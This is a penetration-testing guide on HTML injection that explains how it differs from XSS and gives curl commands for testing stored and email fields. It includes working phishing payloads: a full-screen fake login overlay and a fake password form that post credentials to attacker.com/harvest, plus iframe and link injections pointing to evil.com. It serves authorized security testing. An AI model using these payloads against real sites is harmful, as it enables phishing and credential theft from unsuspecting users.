# HTML Injection Testing

## Objective

Identify input fields where attacker-controlled HTML is rendered in the browser without JavaScript execution — enabling visual phishing, UI redressing, fake login forms, and social engineering attacks within the trusted domain context.

---

## 1. Distinguish from XSS

HTML injection and XSS share the same root cause (unsanitized output) but differ in impact:

| | HTML Injection | XSS |
|---|---|---|
| JavaScript execution | No | Yes |
| Tag execution | Limited (no `<script>`) | Yes |
| `<img>`, `<a>`, `<form>` | Yes | Yes |
| Impact | Phishing, UI manipulation | Session hijack, data theft |
| Severity | Medium | High-Critical |

HTML injection is typically present when:
- The application HTML-encodes `<script>` but not `<img>` or `<a>`
- CSP is present blocking inline scripts but no HTML sanitization exists
- Rich text/markdown rendering partially encodes output

---

## 2. Basic HTML Injection Detection

```bash
# Inject basic HTML tags and check if they render unescaped
MARKER="htmlinj_<b>bold</b>_test"

# GET parameter
curl -si "https://target/search?q=$MARKER" | grep -i "htmlinj"

# POST body
curl -si -X POST https://target/profile/bio \
  -H "Cookie: session=USER_TOKEN" \
  -d "bio=<b>test_injection</b>" | grep -i "<b>"

# Verify: if response contains literal <b> tags (not &lt;b&gt;) → injection confirmed
```

---

## 3. Stored HTML Injection

High-impact fields to test:
- User bio / profile description
- Comment / review body
- Support ticket subject and body
- Username / display name
- Address fields
- Custom URL / website field

```bash
# Inject heading and link
curl -si -X PUT https://target/api/profile \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "bio": "<h1>Injected Heading</h1><a href=https://evil.com>Click here</a>"
  }' | grep HTTP

# Visit the profile page and observe if HTML renders
curl -s "https://target/users/ATTACKER_ID" | grep -i "Injected Heading\|evil.com"
```

---

## 4. Phishing via Stored HTML Injection

Demonstrate phishing impact (PoC only, on test account):

```html
<!-- Fake login overlay injected via stored HTML injection in profile bio -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Session Expired — Please Log In Again</h2>
  <form action="https://attacker.com/harvest" method="POST">
    <input name="username" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
  </form>
</div>
```

---

## 5. Fake Form Injection

```html
<!-- Inject a fake password reset form on the page -->
<form action="https://attacker.com/harvest" method="POST">
  <p>Security Alert: Please confirm your current password</p>
  <input type="password" name="old_password" placeholder="Current password">
  <input type="submit" value="Confirm">
</form>
```

---

## 6. Image Tag Injection (Limited Impact)

```bash
# <img> tag as tracking beacon / SSRF trigger
curl -si -X POST https://target/comment \
  -H "Cookie: session=USER_TOKEN" \
  -d 'body=<img src="https://YOUR_COLLAB.burpcollaborator.net/htmlinj">' | grep HTTP

# Observe if your collaborator receives a request
# This confirms: (a) HTML injection confirmed, (b) potential SSRF path
```

---

## 7. Iframe Injection

```bash
# Inject iframe pointing to malicious page
curl -si -X POST https://target/api/content \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"content":"<iframe src=https://evil.com width=800 height=600></iframe>"}' | grep HTTP
```

---

## 8. Metadata / Email HTML Injection

Some applications embed user-supplied data in HTML emails:

```bash
# Inject HTML into fields used in email templates
curl -si -X POST https://target/contact \
  -d 'name=<b>injected</b>&email=test@test.com&message=test' | grep HTTP

# Test email address field
curl -si -X POST https://target/newsletter \
  -d 'email=test@test.com<script>alert(1)</script>' | grep HTTP
```

---

## Evidence to Capture

- The input field where injection was submitted
- Page source showing unencoded HTML in the response (`<b>`, `<a>`, `<form>` present literally)
- Browser screenshot showing rendered HTML (bold text, link, fake form)
- Full request + response

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| HTML injection in profile/bio (stored) | Pass/Fail | Medium |
| HTML injection in comments/reviews | Pass/Fail | Medium |
| Fake form injection (phishing PoC) | Pass/Fail | Medium-High |
| HTML injection in admin-visible field | Pass/Fail | High |
| Image tag injection (tracking pixel) | Pass/Fail | Low-Medium |
